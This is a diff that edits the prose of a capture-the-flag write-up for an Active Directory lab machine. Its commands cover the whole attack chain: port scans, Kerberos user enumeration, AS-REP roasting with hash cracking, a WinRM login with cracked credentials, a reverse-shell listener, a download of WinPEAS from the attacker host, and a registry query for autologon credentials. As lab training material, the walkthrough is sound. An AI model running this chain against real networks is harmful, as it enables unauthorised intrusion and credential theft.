@@ -20,25 +20,25 @@ aliases:
 
 
 
-We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.
+Let's start with the basics and run an `nmap` scan to see what the machine is exposing.
 
-First let's find the ports
+First, I'll enumerate the open ports.
 
 ```
 nmap $T -sS -Pn -n -p- --min-rate 5000 -oG openPorts.gmap -vvv
 ```
 
-- `$T` is a variable i created to store the IP of the target machine
+- `$T` is a variable I use to hold the target's IP address.
 
-We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again
+I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.
 
-Here you can find the dotfiles for kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)
+You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)
 
 ```
 nmap $T -Pn -n -sVC  --min-rate 3000 -oN results.txt -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49688,49696
 ```
 
-The usual stuff
+The usual Active Directory services.
 
 ```
 netexec smb $T
@@ -47,32 +47,32 @@ SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019
 ```
 
 
-Let's add the domain we discovered to the `/etc/hosts`, this is because `kerberos` usually requires name resolution.
+Let's add the domain we found to `/etc/hosts`, since `kerberos` usually needs name resolution.
 
 ![](../../0.%20Assets/Sauna-1791212433483.webp)
 
-Let's do some enumeration with netexec, anonymous and guest users
+Let's enumerate with netexec using the anonymous and guest users.
 
-All the combinations didn't work so I moved to RPC and I still couldn't get a hold of anything.
+None of the combinations worked, so I moved to RPC and still couldn't get anywhere.
 
-Then I realized that the AD has a website
+Then I noticed the AD host is also serving a website.
 ![](../../0.%20Assets/Sauna-1791212836295.webp)
 
-I tried some brute forcing while I searched for stuff like `robots.txt` 
+I ran some directory brute forcing while also checking for things like `robots.txt`.
 
 ```
 gobuster dir -u http://$T -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_dire
 ctory-list-2.3-medium.txt -t 50
 ```
 
-While the dirbuster was running I found something interesting
+While dirbuster was running, I found something interesting.
 
 ![](../../0.%20Assets/Sauna-1791213011587.webp)
 
 
-Let's try generating a list of possible users with this tool [AD-Username-Generator](https://github.com/mohinparamasivam/AD-Username-Generator?utm_source=chatgpt.com)
+Let's generate a list of possible usernames with this tool: [AD-Username-Generator](https://github.com/mohinparamasivam/AD-Username-Generator?utm_source=chatgpt.com)
 
-so let's make a list with the users and run the tool
+Let's build a list of names and run the tool.
 
 ![](../../0.%20Assets/Sauna-1791213230283.webp)
 
@@ -85,7 +85,7 @@ python3 username-generate.py -u ../possible_users.txt -o possibleUsers.txt
 
 ![](../../0.%20Assets/Sauna-1791213368723.webp)
 
-Now we have a list of possible users, let's find out if any of these users actually exist
+Now we have a list of candidate usernames. Let's find out which ones actually exist.
 
 ```
 ./kerbrute userenum --dc $T -d egotistical-bank.local possibleUsers.txt
@@ -93,11 +93,11 @@ Now we have a list of possible users, let's find out if any of these users actua
 
 ![](../../0.%20Assets/Sauna-1791213699436.webp)
 
-And we have a user!
+And we have a valid user.
 
-Cool let's add it to a user list for credentials
+Let's add it to a list to track credentials.
 
-Okay next logical step is to `as-rep` roast and try to get the hash for `Fsmith`
+The next logical step is to `as-rep` roast and try to grab the hash for `Fsmith`.
 
 ```
 impacket-GetNPUsers 'EGOTISTICAL-BANK.LOCAL/Fsmith' \             
@@ -109,9 +109,9 @@ impacket-GetNPUsers 'EGOTISTICAL-BANK.LOCAL/Fsmith' \
 
 ![](../../0.%20Assets/Sauna-1791213905027.webp)
 
-Nice !
+We got a hash.
 
-Let's crack it
+Let's crack it.
 
 ```
 hashcat -m 18200 asrep-impacket.txt /usr/share/wordlists/rockyou.txt
@@ -119,9 +119,9 @@ hashcat -m 18200 asrep-impacket.txt /usr/share/wordlists/rockyou.txt
 
 ![](../../0.%20Assets/Sauna-1791213981693.webp)
 
-Nice!! let's see what we can do with this new credentials
+Now let's see what these credentials get us.
 
-I used [nxcspray](https://github.com/NTHSec/nxcspray) to test all protocols with these credentials.
+I used [nxcspray](https://github.com/NTHSec/nxcspray) to test every protocol with these credentials.
 
 ```
 ./nxcspray all $T -u 'Fsmith' -p 'Thestrokes23'
@@ -129,7 +129,7 @@ I used [nxcspray](https://github.com/NTHSec/nxcspray) to test all protocols with
 
 ![](../../0.%20Assets/Sauna-1791214233233.webp)
 
-Great, we can remotely connect to the machine via `WINRM` we will use `evil-winrm` for that
+We can connect remotely over `WINRM`, so let's use `evil-winrm` for that.
 
 ```
 evil-winrm -i $T -u Fsmith -p 'Thestrokes23'
@@ -137,7 +137,7 @@ evil-winrm -i $T -u Fsmith -p 'Thestrokes23'
 
 ![](../../0.%20Assets/Sauna-1791214381991.webp)
 
-And as usual, I like to use `penelope` for reverse shells
+As usual, I like to use `penelope` for reverse shells.
 
 ```
 penelope -O -p 1337 -a -i tun0
@@ -148,9 +148,9 @@ penelope -O -p 1337 -a -i tun0
 
 ![](../../0.%20Assets/Sauna-1791214608468.webp)
 
-And there we can find the flag
+And there we find the flag.
 
-I will now recollect data for bloodhound, I wanted to try `rusthound-ce` and I have to say I worked really well, I would recommend it
+Now I'll collect data for BloodHound. I wanted to try `rusthound-ce`, and it worked really well. I'd recommend it.
 
 ```
  ./rusthound-ce -d EGOTISTICAL-BANK.LOCAL -u 'Fsmith@EGOTISTICAL-BANK.LOCAL' -p 'Thestrokes23' -f $T -z
@@ -159,7 +159,7 @@ I will now recollect data for bloodhound, I wanted to try `rusthound-ce` and I h
 
 ![](../../0.%20Assets/Sauna-1791217668385.webp)
 
-I don't immediately see a path, so let's do some enumeration, Trying ``PowerUp`` the session breaks so I tried ``winPeas``, and it still broke so i got out of Penelope
+I don't see an obvious path, so let's do some enumeration. `PowerUp` kept breaking the session, so I tried `winPEAS`, which also broke it, so I dropped out of Penelope.
 
 ``
 ```
@@ -168,8 +168,8 @@ iwr -uri http://10.10.15.226/WinPEASx64.exe -Outfile WinPEASx64.exe
 ./WinPEASx64.exe
 ```
 
-I found some Auto logon credentials
-We can see more information with this command
+I found some auto-logon credentials.
+We can see more detail with this command.
 
 ```
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
@@ -179,7 +179,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 
 ![](../../0.%20Assets/Sauna-1791222857499.webp)
 
-And thanks to us doing some enumeration with bloodhound we find that we can perform a `DCSync` on the domain
+And thanks to our enumeration in BloodHound, we find we can perform a `DCSync` against the domain.
 
 
 ![](../../0.%20Assets/Sauna-1791224159891.webp)
